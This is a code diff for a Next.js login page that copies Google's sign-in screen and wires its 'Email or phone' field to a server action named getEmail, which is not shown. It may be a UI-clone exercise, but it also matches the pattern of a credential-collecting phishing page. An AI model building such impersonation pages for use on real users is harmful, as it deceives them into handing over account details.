@@ -1,7 +1,6 @@
-import React from "react";
 import NextButtonLogin from "@/components/NextButtonLogin";
-
-export default function Login({ params }) {
+import { getEmail } from "@/actions";
+export default function Login() {
   return (
     <div className="flex w-screen overflow-hidden relative flex-col bg-white text-black p-5 h-screen">
       <div className="w-full  flex h-20">
@@ -34,13 +33,14 @@ export default function Login({ params }) {
       </div>
       <h1 className="text-3xl pb-3">Sign in</h1>
       <span>Use your Google Account</span>
-      <form>
+      <form action={getEmail}>
         <div>
           <input
             required
             className="border p-3 mb-3 mt-3 rounded bg-white w-full"
             placeholder="Email or phone"
             type="text"
+            name="email"
           />
           <span className="text-blue-700 ">Forget Email?</span>
           <h1 className=" pt-10">
